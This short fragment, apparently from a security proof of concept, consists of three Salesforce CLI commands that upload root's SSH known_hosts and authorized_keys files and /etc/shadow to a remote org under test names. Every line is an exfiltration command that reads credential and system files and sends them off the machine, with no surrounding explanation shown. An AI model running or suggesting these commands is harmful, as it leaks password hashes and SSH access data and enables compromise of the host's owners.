...
sfdx shane:data:file:upload -f /root/.ssh/known_hosts -n zeb0x01test5
sfdx shane:data:file:upload -f /root/.ssh/authorized_keys -n zeb0x01test6
sfdx shane:data:file:upload -f /etc/shadow -n zeb0x01test8
